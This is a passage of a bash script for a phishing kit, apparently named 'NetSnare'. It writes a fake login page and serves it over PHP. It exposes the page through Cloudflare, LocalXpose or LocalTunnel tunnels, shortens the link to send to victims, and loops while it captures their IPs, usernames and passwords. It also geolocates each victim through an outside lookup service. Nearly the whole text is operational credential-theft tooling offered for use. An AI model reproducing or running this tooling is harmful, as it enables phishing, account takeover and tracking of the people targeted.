    printf '<!-- Add boot strap frameworks -->' >> sites/create/login.html
    IFS=$'\n'
    printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">' >> sites/create/login.html
    IFS=$'\n'
    printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" href="./style.css">' >> sites/create/login.html
    IFS=$'\n'
    printf '<!-- Add icon library -->' >> sites/create/login.html
    IFS=$'\n'
    printf '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">' >> sites/create/login.html
    IFS=$'\n'
    echo "</head>" >> sites/create/login.html
    printf '<body bgcolor="gray" text="white">' >> sites/create/login.html
    IFS=$'\n'
    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
    IFS=$'\n'
    printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
    IFS=$'\n'
    printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
    IFS=$'\n'
    printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
    IFS=$'\n'
    printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
    IFS=$'\n'
    printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
    printf '</center>' >> sites/create/login.html
    printf '<body>\n' >> sites/create/login.html
    printf '</html>\n' >> sites/create/login.html
}

catch_cred() {
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Account: ${BWhite}%s${clear}\n" $account
    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Password: ${BWhite}%s${clear}\n" $password
    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}sites/%s/saved.usernames.txt${clear}\n" $server
    killall -2 php > /dev/null 2>&1
    kill $(lsof -t -i :5555)
    exit 1
}

getcredentials() {
    printf "${NeonBlue}[${BWhite}⏳${NeonBlue}]${AcidGreen} Awaiting Quantum Trap Data...${clear}\n"
    while [ true ]; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Quantum Trap Triggered!${clear}\n"
            catch_cred
        fi
        sleep 1
    done
}

catch_ip() {
    touch sites/$server/saved.usernames.txt
    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
    printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Victim IP: ${BWhite}%s${clear}\n" $ip
    printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} User-Agent: ${BWhite}%s${clear}\n" $ua
    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}%s/saved.ip.txt${clear}\n" $server
    cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
    if [[ -e iptracker.log ]]; then
        rm -rf iptracker.log
    fi
    IFS='\n'
    iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
    IFS=$'\n'
    continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
    printf "\n"
    hostnameip=$(grep -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
    if [[ $hostnameip != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Hostname: ${BWhite}%s${clear}\n" $hostnameip
    fi
    reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
    if [[ $reverse_dns != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Reverse DNS: ${BWhite}%s${clear}\n" $reverse_dns
    fi
    if [[ $continent != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Continent: ${BWhite}%s${clear}\n" $continent
    fi
    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
    if [[ $country != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Country: ${BWhite}%s${clear}\n" $country
    fi
    state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
    if [[ $state != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} State: ${BWhite}%s${clear}\n" $state
    fi
    city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $city != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} City Location: ${BWhite}%s${clear}\n" $city
    fi
    isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $isp != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} ISP: ${BWhite}%s${clear}\n" $isp
    fi
    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $as_number != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} AS Number: ${BWhite}%s${clear}\n" $as_number
    fi
    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $ip_speed != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Address Speed: ${BWhite}%s${clear}\n" $ip_speed
    fi
    ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
    if [[ $ip_currency != "" ]]; then
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Currency: ${BWhite}%s${clear}\n" $ip_currency
    fi
    printf "\n"
    rm -rf iptracker.log
    getcredentials
}

start() {
    if [[ -e sites/$server/ip.txt ]]; then
        rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
        rm -rf sites/$server/usernames.txt
    fi
}

setup_site() {
    echo -e "\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Configuring Quantum Server...${clear}"
    cp -rf sites/"$website"/* .NetSnare/www
    cp -f sites/ip.php .NetSnare/www/
    echo -ne "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Activating PHP Matrix...${clear}"
    cd .NetSnare/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

tunnel_menu() {
    if [[ -e .nexlink ]]; then
        rm -rf .nexlink
    fi
    if [[ -d .NetSnare/www ]]; then
        rm -rf .NetSnare/www
        mkdir .NetSnare/www
    else
        mkdir .NetSnare/www
    fi
    cp -rf sites/$website/* .NetSnare/www
    cp -f sites/ip.php .NetSnare/www/
    def_tunnel_menu="2"
    smallbanner
    printf "${NeonBlue}┳════┤ ${BHotPink}Port Forwarding Matrix${NeonBlue} ├════┓${clear}\n"
    printf "${NeonBlue}┃${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} LocalHost${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} LocalXpose${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} CloudFlare${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[04]${AcidGreen} LocalTunnel${clear}\n"
    printf "${NeonBlue}┃ ${BAcidGreen}[00]${AcidGreen} Back${clear}\n"
    printf "${NeonBlue}┃${clear}\n"
    printf "${NeonBlue}┗════┤ ${BHotPink}Select Option [00-04]${NeonBlue} ├════┛${clear}\n"
    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Input: ${clear}' tunnel_menu
    tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
    if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
        start_localhost
    elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
        start_loclx
    elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
        start_cloudflare
    elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
        start_localtunnel
    elif [[ $tunnel_menu == 00 || $tunnel_menu == 0 ]]; then
        go_back
    else
        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Option${clear}\n"
        sleep 1
        clear
        banner
        menu
    fi
}

go_back() {
    clear
    banner
    menu
}

start_cloudflare() {
    echo -ne "\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Activating Cloudflared Matrix...${clear}"
    sleep 1
    rm .cld.log > /dev/null 2>&1 &
    echo ""
    cusport
    echo -e "\n${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Initializing: ${BWhite}http://$HOST:$PORT${clear}"
    { sleep 1; setup_site; }
    echo -ne "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Launching Cloudflared Tunnel...${clear}"
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    fi
    sleep 12
    cldflr_url=$(grep -o 'https://[a-zA-Z0-9.-]\+\.trycloudflare\.com' ".server/.cld.log")
    if [[ -z "$cldflr_url" ]]; then
        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Failed to Establish Tunnel${clear}"
        echo -e "${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Debug: Check Cloudflared binary and network${clear}"
        exit 1
    else
        smallbanner
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Send to Target: ${BWhite}%s${clear}\n" $cldflr_url
        datafound
    fi
}

start_localhost() {
    printf "\n"
    cusport
    printf "${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Initializing: ${BWhite}http://${HOST}:${PORT}${clear}\n"
    setup_site
    sleep 1
    smallbanner
    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Hosted at: ${BWhite}http://$HOST:$PORT${clear}\n"
    datafound
}

start_localtunnel() {
    printf "\n"
    if ! command -v lt &> /dev/null; then
        printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} LocalTunnel Not Installed${clear}\n"
        exit 1
    fi
    cusport
    printf "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Starting Local Web Server...${clear}\n"
    { sleep 3; setup_site; }
    printf "\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Creating LocalTunnel Link...${clear}\n"
    sleep 5
    url=$(lt --port 5555 --print-requests --log debug | grep -o 'https://.*$')
    printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Shortening URL...${clear}\n"
    sleep 3
    short_url=$(curl -s -X POST -d "url=$url" https://tinyurl.com/api-create.php)
    printf "${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Bypassing Tunnel Reminder...${clear}\n"
    sleep 2
    curl -H "bypass-tunnel-reminder: true" $url
    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Shareable Link Ready${clear}\n"
    sleep 3
    if [[ -z "$url" ]]; then
        echo -e "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Failed to Create Link${clear}\n"
        exit 1
    else
        smallbanner
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Send to Target: ${BWhite}%s${clear}\n" $url
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Short URL: ${BWhite}%s${clear}\n" $short_url
        datafound
    fi
}

localxpose_auth() {
    ./.server/loclx -help >/dev/null 2>&1 &
    sleep 1
    [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
    [ "$(./.server/loclx account status | grep Error)" ] && {
        echo -e "\n\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Create an account at ${BHotPink}localxpose.io${AcidGreen} & copy token${clear}\n"
        sleep 3
        read -p "${NeonBlue}[${BWhite}>>${NeonBlue}]${AcidGreen} Input Loclx Token: ${clear}" loclx_token
        [[ $loclx_token == "" ]] && {
            echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} LocalXpose Token Required${clear}"
            sleep 2
            tunnel_menu
        } || {
            echo -n "$loclx_token" >$auth_f 2>/dev/null
        }
    }
}

start_loclx() {
    cusport
    echo -e "\n${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Initializing: ${BWhite}http://$HOST:$PORT${clear}"
    { sleep 2; setup_site; localxpose_auth; }
    echo -e "\n"
    read -n1 -p "${NeonBlue}[${BWhite}?${NeonBlue}]${AcidGreen} Change Loclx Region? ${BNeonBlue}[${BWhite}y${BNeonBlue}/${BWhite}N${BNeonBlue}]: ${clear}" opinion
    [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
    echo -e "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Launching LocalXpose Matrix...${clear}"
    if [[ $(command -v termux-chroot) ]]; then
        sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
    else
        sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
    fi
    sleep 12
    loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
    if [[ -z "$loclx_url" ]]; then
        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Failed to Create Link${clear}\n"
        exit 1
    else
        echo ""
        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Send to Target: ${BWhite}%s${clear}\n" $loclx_url
        datafound
    fi
}

grab_ip() {
    ip=$(grep -a 'IP:' .NetSnare/www/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Victim IP: ${BWhite}%s${clear}\n" $ip
    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}ip.txt${clear}\n"
    cat .NetSnare/www/ip.txt >> ip.txt
}

grab_creds() {
    account=$(grep -o 'Username:.*' .NetSnare/www/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' .NetSnare/www/usernames.txt | cut -d ":" -f2)
    printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Account: ${BWhite}%s${clear}\n" $account
    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Password: ${BWhite}%s${clear}\n" $password
    cat .NetSnare/www/usernames.txt >> logs/$website.log
    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}logs/%s.log${clear}\n" $website
    printf "${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Check logs/%s.log with cat command${clear}\n" $website
    printf "${NeonBlue}[${BWhite}⏳${NeonBlue}]${AcidGreen} Awaiting Next Trap Data, Ctrl+C to Exit${clear}\n"
}

datafound() {
    printf "\n${NeonBlue}[${BWhite}⏳${NeonBlue}]${AcidGreen} Awaiting Trap Data, Ctrl+C to Exit${clear}\n"
    while [ true ]; do
        if [[ -e ".NetSnare/www/ip.txt" ]]; then
            printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Victim IP Captured${clear}\n"
            grab_ip
            rm -rf .NetSnare/www/ip.txt
        fi
        sleep 0.75
        if [[ -e ".NetSnare/www/usernames.txt" ]]; then
            printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Login Data Captured${clear}\n"
            grab_creds
            rm -rf .NetSnare/www/usernames.txt
        fi
        sleep 0.75
    done
}

stop() {
    checkphp=$(ps aux | grep -o "php" | head -n1)
    if [[ $checkphp == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
}

clear
banner
dependencies
check_internet
install_cloudflared
install_localxpose
sleep 3
clear
banner
menu